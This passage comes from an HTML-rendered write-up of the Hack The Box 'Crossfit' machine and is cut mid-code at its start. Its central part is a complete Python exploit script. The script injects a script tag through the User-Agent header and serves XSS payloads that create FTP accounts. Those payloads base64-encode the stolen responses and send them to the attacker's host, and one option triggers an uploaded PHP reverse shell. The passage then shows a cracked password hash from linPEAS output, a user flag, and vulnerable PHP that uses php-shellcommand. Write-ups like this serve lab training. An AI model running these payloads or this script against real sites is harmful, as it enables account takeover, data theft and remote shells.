<span class="w">        </span><span class="err">y.open("POST",</span><span class="w"> </span><span class="err">"</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">ftp</span><span class="o">.</span><span class="n">crossfit</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">accounts</span><span class="s2">");</span>
<span class="s2">        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');</span>
<span class="s2">        y.withCredentials = true;</span>
<span class="s2">        y.onreadystatechange = function() {</span>
<span class="s2">            if(y.readyState == 4) {</span>
<span class="s2">                z = new XMLHttpRequest;</span>
<span class="s2">                z.open("</span><span class="n">GET</span><span class="s2">", "</span><span class="n">http</span><span class="o">://</span><span class="mf">10.10.14.52</span><span class="o">:</span><span class="mi">80</span><span class="o">/</span><span class="n">get_result</span><span class="o">.</span><span class="n">html</span><span class="o">?</span><span class="n">p</span><span class="o">=</span><span class="s2">"+btoa(r_txt + post_data + this.responseText));</span>
<span class="s2">                z.send()</span>
<span class="s2">            }</span>
<span class="s2">        };</span>
<span class="s2">        y.send(post_data);</span>
<span class="s2">    }</span>
<span class="s2">}</span>
<span class="s2">x.open("</span><span class="n">GET</span><span class="s2">", "</span><span class="n">http</span><span class="o">://</span><span class="n">ftp</span><span class="o">.</span><span class="n">crossfit</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">accounts</span><span class="o">/</span><span class="n">create</span><span class="err">"</span><span class="p">);</span><span class="w"></span>
<span class="err">x.withCredentials</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">true</span><span class="p">;</span><span class="w"></span>
<span class="err">x.send()</span><span class="p">;</span><span class="w"></span>
</code></pre>
</div>
</div>
</div>
</section>
<section class="wrapper style4 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-getting-in-by-uploading-naughty-php-files-to-the-ftp-server">
 Initial: Getting In By Uploading Naughty PHP Files To The FTP Server
</h2>
<p>
 After I created my FTP account, I couldn't get
 <code>
  ftp
 </code>
 of
 <code>
  sftp
 </code>
 to work for some reason, but I was too lazy to find a good CLI solution and just used FileZilla instead.
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/ftpfilezilla.png"/>
</p>
<p>
 I could now see the source code for the different web servers that were running on the machine. There was also an empty folder called
 <code>
  development-test
 </code>
 that I could upload files to, which is
 <em>
  very very very very
 </em>
 interesting.
</p>
<p>
 If the
 <code>
  development-test
 </code>
 folder was used to stage source code before production and was live, then I could upload some malicious code into that folder and gain access that way. I quickly found that when my files were uploaded I could access them using the previously mentioned XSS exploit to fetch my content on the subdomain
 <code>
  development-test.crossfit.htb
 </code>
 . Guessing that PHP was used on the development server, I first uploaded a PHP reverse shell file and...
</p>
<p>
 <img alt="" class="center" src="/images/writeups/htb_machines/crossfit/wearein.png"/>
</p>
<p>
 <strong>
  WE ARE IN BAAAAAAAAAAAAAAAABBBBBBBY!!!
 </strong>
</p>
</div>
</div>
</section>
<section class="wrapper style3 ">
<div class="inner">
<div class="content">

<h2 class="major" id="initial-using-python-to-handle-the-http-requests-to-perform-the-xss-attacks">
 Initial: Using Python To Handle the HTTP Requests to Perform the XSS Attacks
</h2>
<p>
 To help me carry out my XSS exploits, I created a Python script that handles the HTTP requests, JavaScript payloads and the decoding of the exfiltrated data automatically. It should work without any issues for you, with the exception that you need to name your uploaded PHP reverse shell as
 <code>
  rs.php
 </code>
 (you can change this within the source code of course).
</p>
<details>
 <summary>
  <b>
   Python Exploit Code
  </b>
 </summary>
 <div class="codehilite">
  <pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">threading</span><span class="o">,</span> <span class="nn">queue</span><span class="o">,</span> <span class="nn">argparse</span><span class="o">,</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">logging</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>

<span class="k">class</span> <span class="nc">PayloadHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="n">FTP_CREATE_PAYLOAD</span> <span class="o">=</span> <span class="s2">"""</span>
<span class="s2">  x = new XMLHttpRequest;</span>
<span class="s2">  x.onreadystatechange = function() {{</span>
<span class="s2">    if(x.readyState == 4) {{</span>
<span class="s2">        r_txt = this.responseText;</span>

<span class="s2">        // Gets the nonce from the account creation page.</span>
<span class="s2">        re = new RegExp('&lt;input type="hidden" name="_token" value="(.*?)"&gt;')</span>
<span class="s2">        token = r_txt.match(re)[1];</span>

<span class="s2">        post_data = "_token=" + token + "&amp;username=</span><span class="si">{username}</span><span class="s2">&amp;pass=</span><span class="si">{password}</span><span class="s2">"</span>

<span class="s2">        y = new XMLHttpRequest;</span>
<span class="s2">        y.open("POST", "http://ftp.crossfit.htb/accounts");</span>
<span class="s2">        y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');</span>
<span class="s2">        y.withCredentials = true;</span>
<span class="s2">        y.onreadystatechange = function() {{</span>
<span class="s2">            if(y.readyState == 4) {{</span>
<span class="s2">                z = new XMLHttpRequest;</span>
<span class="s2">                z.open("GET", "http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/get_result.html?p="+btoa(r_txt + post_data + this.responseText));</span>
<span class="s2">                z.send()</span>
<span class="s2">            }}</span>
<span class="s2">        }};</span>
<span class="s2">        y.send(post_data);</span>
<span class="s2">    }}</span>

<span class="s2">  }}</span>
<span class="s2">  x.open("GET", "http://ftp.crossfit.htb/accounts/create");</span>
<span class="s2">  x.withCredentials = true;</span>
<span class="s2">  x.send();</span>
<span class="s2">  """</span>

    <span class="n">REVERSE_SHELL_PAYLOAD</span> <span class="o">=</span> <span class="s2">"""</span>
<span class="s2">  async function postData(url = '', data = '') {{</span>
<span class="s2">    const response = await fetch(url, {{</span>
<span class="s2">        method: "POST",</span>
<span class="s2">        body: data</span>
<span class="s2">    }});</span>
<span class="s2">    return response</span>
<span class="s2">  }}</span>

<span class="s2">  fetch("http://development-test.crossfit.htb/rs.php")</span>
<span class="s2">  .then(function(data) {{</span>
<span class="s2">    data.text().then(function(r_txt) {{</span>
<span class="s2">        fetch("http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/get_result.html?p="+btoa(r_txt));</span>
<span class="s2">    }});</span>
<span class="s2">  }});</span>
<span class="s2">  """</span>

    <span class="n">lhost</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="n">lport</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="n">payload_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">_set_response</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">send_header</span><span class="p">(</span><span class="s1">'Content-type'</span><span class="p">,</span> <span class="s1">'text/html'</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">end_headers</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="s2">"/get_result.html"</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">:</span>
            <span class="n">encoded_data</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span><span class="p">[</span><span class="mi">19</span><span class="p">:]</span>
            <span class="n">decoded_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded_data</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">decoded_data</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">path</span> <span class="o">==</span> <span class="s2">"/payload.js"</span><span class="p">:</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">_set_response</span><span class="p">()</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))</span>
            <span class="k">return</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">_set_response</span><span class="p">()</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">"Hi there!</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">"utf-8"</span><span class="p">))</span>


    <span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">payload_file</span><span class="p">):</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">"User-Agent"</span> <span class="p">:</span> <span class="s2">"&lt;script src=http://</span><span class="si">{lhost}</span><span class="s2">:</span><span class="si">{lport}</span><span class="s2">/</span><span class="si">{payload}</span><span class="s2"> &gt;&lt;/script&gt;"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
                <span class="n">lhost</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span>
                <span class="n">lport</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span><span class="p">,</span>
                <span class="n">payload</span><span class="o">=</span><span class="n">payload_file</span>
            <span class="p">)</span>
        <span class="p">}</span>

        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s2">"name"</span> <span class="p">:</span> <span class="s2">"fakename"</span><span class="p">,</span>
            <span class="s2">"email"</span> <span class="p">:</span> <span class="s2">"fake@email.com"</span><span class="p">,</span>
            <span class="s2">"phone"</span> <span class="p">:</span> <span class="s2">"420696969"</span><span class="p">,</span>
            <span class="s2">"message"</span> <span class="p">:</span> <span class="s2">"&lt;script&gt;"</span><span class="p">,</span> <span class="c1"># Needed to trigger the security report</span>
            <span class="s2">"submit"</span> <span class="p">:</span> <span class="s2">"submit"</span>
        <span class="p">}</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">"Sending Payload to: </span><span class="si">{}</span><span class="s2">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload_file</span><span class="p">))</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"http://gym-club.crossfit.htb/blog-single.php"</span><span class="p">,</span>
                            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
                            <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">_worker</span><span class="p">():</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">payload_file</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>

            <span class="k">if</span> <span class="n">payload_file</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
                <span class="k">break</span>

            <span class="k">if</span> <span class="n">payload_file</span> <span class="o">==</span> <span class="s2">"wait"</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="s2">"Starting Exploit in 2 seconds!"</span><span class="p">)</span>
                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
                <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>
                <span class="k">continue</span>
            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">send_request</span><span class="p">(</span><span class="n">payload_file</span><span class="p">)</span>
            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">task_done</span><span class="p">()</span>


    <span class="k">def</span> <span class="nf">set_payloads</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">):</span>
        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span> <span class="o">=</span> <span class="n">lhost</span>
        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span> <span class="o">=</span> <span class="n">lport</span>

        <span class="k">if</span> <span class="n">trigger_rs</span><span class="p">:</span>
            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">REVERSE_SHELL_PAYLOAD</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">FTP_CREATE_PAYLOAD</span>

        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
            <span class="n">lhost</span><span class="o">=</span><span class="n">lhost</span><span class="p">,</span>
            <span class="n">lport</span><span class="o">=</span><span class="n">lport</span><span class="p">,</span>
            <span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span>
            <span class="n">password</span><span class="o">=</span><span class="n">password</span>
        <span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
        <span class="n">worker_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">_worker</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
        <span class="n">worker_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">)</span>
        <span class="n">httpd</span> <span class="o">=</span> <span class="n">HTTPServer</span><span class="p">((</span><span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">lport</span><span class="p">),</span> <span class="n">PayloadHandler</span><span class="p">)</span>
        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="s2">"wait"</span><span class="p">))</span>
        <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">payload_queue</span><span class="o">.</span><span class="n">put</span><span class="p">((</span><span class="s2">"payload.js"</span><span class="p">))</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
            <span class="k">pass</span>

        <span class="n">worker_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
        <span class="n">httpd</span><span class="o">.</span><span class="n">server_close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">parse_args</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">"Exploitation script for Crossfit to create FTP accounts"</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-u'</span><span class="p">,</span> <span class="s1">'--username'</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s1">'the name of the FTP user to create'</span><span class="p">,</span>
                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-p'</span><span class="p">,</span> <span class="s1">'--password'</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s1">'the password to set for the FTP account'</span><span class="p">,</span>
                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-H'</span><span class="p">,</span> <span class="s1">'--lhost'</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s1">'your IP address for hosting the web server'</span><span class="p">,</span>
                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-P'</span><span class="p">,</span> <span class="s1">'--lport'</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s1">'the port to use for the web server'</span><span class="p">,</span>
                        <span class="n">required</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
                        <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'-R'</span><span class="p">,</span> <span class="s1">'--trigger_rs'</span><span class="p">,</span>
                        <span class="n">help</span><span class="o">=</span><span class="s2">"Should trigger the uploaded reverse shell instead of creating a FTP account"</span><span class="p">,</span>
                        <span class="n">action</span><span class="o">=</span><span class="s2">"store_true"</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">):</span>
    <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">set_payloads</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">trigger_rs</span><span class="p">)</span>
    <span class="n">PayloadHandler</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parse_args</span><span class="p">()</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">username</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">password</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">lhost</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">lport</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">trigger_rs</span><span class="p">)</span>
</code></pre>
 </div>
</details>
</div>
</div>
</section>
<section class="wrapper style2 alt">
<div class="inner">
<div class="content">

<h2 class="major" id="user-1-how-to-run-linpeas">
 User 1: How To Run LinPEAS
</h2>
<p>
 A fairly standard task to do when you have access to a machine is to run privilege escalation tools on the box. I used the lovely
 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">
  linPEAS
 </a>
 to see if it could automatically find anything juicy for me, which it found a stored hash for the user
 <code>
  hank
 </code>
 in
 <code>
  /etc/ansible/playbooks/adduser_hank.yml
 </code>
 .
</p>
<div class="codehilite">
 <pre><span></span><code>[<span class="o">+</span>]<span class="w"> </span><span class="nv">Looking</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">specific</span><span class="w"> </span><span class="nv">hashes</span><span class="w"> </span><span class="nv">inside</span><span class="w"> </span><span class="nv">files</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">less</span><span class="w"> </span><span class="nv">false</span><span class="w"> </span><span class="nv">positives</span><span class="w"> </span><span class="ss">(</span><span class="nv">limit</span><span class="w"> </span><span class="mi">70</span><span class="ss">)</span><span class="w"></span>
<span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">ansible</span><span class="o">/</span><span class="nv">playbooks</span><span class="o">/</span><span class="nv">adduser_hank</span>.<span class="nv">yml</span>:<span class="mh">$6$e20D6</span><span class="nv">nUeTJOIyRio</span><span class="mh">$A777</span><span class="nv">Jj8tk5</span>.<span class="nv">sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM</span>.<span class="nv">Iov</span><span class="o">/</span><span class="nv">pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG</span><span class="o">/</span><span class="w"></span>
</code></pre>
</div>
<p>
 This hash could be cracked using the RockYou wordlist and is 'powerpuffgirls'. So I tried logging in as
 <code>
  hank
 </code>
 on the box and
 <strong>
  BINGO!
 </strong>
 I had access to
 <code>
  hank
 </code>
 on the box and the got the user flag!
</p>
<div class="codehilite">
 <pre><span></span><code><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">su</span> <span class="n">hank</span>
<span class="n">su</span> <span class="n">hank</span>
<span class="n">Password</span><span class="p">:</span> <span class="n">powerpuffgirls</span>

<span class="n">hank</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">cd</span>
<span class="n">cd</span>
<span class="n">hank</span><span class="nd">@crossfit</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cat</span> <span class="n">user</span><span class="o">.</span><span class="n">txt</span>
<span class="n">cf710dc09c2e30d3609fedfd8f7c0d37</span>
</code></pre>
</div>
<p>
 <em>
  Easily the hardest part of this machine.
 </em>
</p>
</div>
</div>
</section>
<section class="wrapper style5 ">
<div class="inner">
<div class="content">

<h2 class="major" id="user-2-escalating-privileges-using-the-ftp-mysql-and-php-servers">
 User 2: Escalating Privileges Using The FTP, MySQL and PHP Servers
</h2>
<p>
 Besides
 <code>
  hank
 </code>
 , there was another user called
 <code>
  isaac
 </code>
 on the box that had exposed some interesting source code for some PHP file called
 <code>
  send_updates.php
 </code>
 .
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">hank</span><span class="err">@</span><span class="n">crossfit</span><span class="p">:</span><span class="o">~$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="o">/</span><span class="n">send_updates</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span><span class="w"></span>
<span class="o">/***************************************************</span><span class="w"></span>
<span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">Send</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="n">updates</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">mailing</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="o">*</span><span class="w"></span>
<span class="w"> </span><span class="o">***************************************************/</span><span class="w"></span>
<span class="n">require</span><span class="p">(</span><span class="s2">"vendor/autoload.php"</span><span class="p">);</span><span class="w"></span>
<span class="n">require</span><span class="p">(</span><span class="s2">"includes/functions.php"</span><span class="p">);</span><span class="w"></span>
<span class="n">require</span><span class="p">(</span><span class="s2">"includes/db.php"</span><span class="p">);</span><span class="w"></span>
<span class="n">require</span><span class="p">(</span><span class="s2">"includes/config.php"</span><span class="p">);</span><span class="w"></span>
<span class="n">use</span><span class="w"> </span><span class="n">mikehaertl</span>\<span class="n">shellcommand</span>\<span class="n">Command</span><span class="p">;</span><span class="w"></span>

<span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">conn</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="o">$</span><span class="n">fs_iterator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">FilesystemIterator</span><span class="p">(</span><span class="o">$</span><span class="n">msg_dir</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="n">foreach</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">fs_iterator</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">file_info</span><span class="p">)</span><span class="w"></span>
<span class="w">    </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">file_info</span><span class="o">-&gt;</span><span class="n">isFile</span><span class="p">())</span><span class="w"></span>
<span class="w">        </span><span class="p">{</span><span class="w"></span>
<span class="w">            </span><span class="o">$</span><span class="n">full_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">file_info</span><span class="o">-&gt;</span><span class="n">getPathname</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="o">$</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">conn</span><span class="o">-&gt;</span><span class="n">query</span><span class="p">(</span><span class="s1">'SELECT email FROM users'</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">while</span><span class="p">(</span><span class="o">$</span><span class="n">row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">fetch_array</span><span class="p">(</span><span class="n">MYSQLI_ASSOC</span><span class="p">))</span><span class="w"></span>
<span class="w">            </span><span class="p">{</span><span class="w"></span>
<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Command</span><span class="p">(</span><span class="s1">'/usr/bin/mail'</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">addArg</span><span class="p">(</span><span class="s1">'-s'</span><span class="p">,</span><span class="w"> </span><span class="s1">'CrossFit Club Newsletter'</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">escape</span><span class="o">=</span><span class="bp">true</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">addArg</span><span class="p">(</span><span class="o">$</span><span class="n">row</span><span class="p">[</span><span class="s1">'email'</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">escape</span><span class="o">=</span><span class="bp">true</span><span class="p">);</span><span class="w"></span>

<span class="w">                </span><span class="o">$</span><span class="n">msg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">full_path</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">setStdIn</span><span class="p">(</span><span class="s1">'test'</span><span class="p">);</span><span class="w"></span>
<span class="w">                </span><span class="o">$</span><span class="n">command</span><span class="o">-&gt;</span><span class="n">execute</span><span class="p">();</span><span class="w"></span>
<span class="w">            </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">full_path</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="p">}</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>

<span class="n">cleanup</span><span class="p">();</span><span class="w"></span>
<span class="err">?</span><span class="o">&gt;</span><span class="w"></span>
</code></pre>
</div>
<p>
 The above PHP code emails files that are uploaded to some message folder to all emails that are stored within a database using
 <a href="https://github.com/mikehaertl/php-shellcommand">
  mikehaertl's php-shellcommand
 </a>
 . Unfortunately I could not view what was stored inside of the
 <code>
  config.php
 </code>
 and
 <code>
  db.php
 </code>
 files, but I can see that php-shellcommand version 1.6.0 was used by looking at the
 <code>
  composer.json
 </code>
 file.
</p>
<div class="codehilite">
 <pre><span></span><code><span class="n">hank</span><span class="nv">@crossfit</span><span class="err">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">isaac</span><span class="o">/</span><span class="n">send_updates</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">composer</span><span class="p">.</span><span class="n">json</span><span class="w"></span>
<span class="err">{</span><span class="w"></span>
<span class="w">    </span><span class="ss">"require"</span><span class="err">:</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
<span class="w">        </span><span class="ss">"mikehaertl/php-shellcommand"</span><span class="err">:</span><span class="w"> </span><span class="ss">"1.6.0"</span><span class="w"></span>
<span class="w">    </span><span class="err">}</span><span class="w"></span>
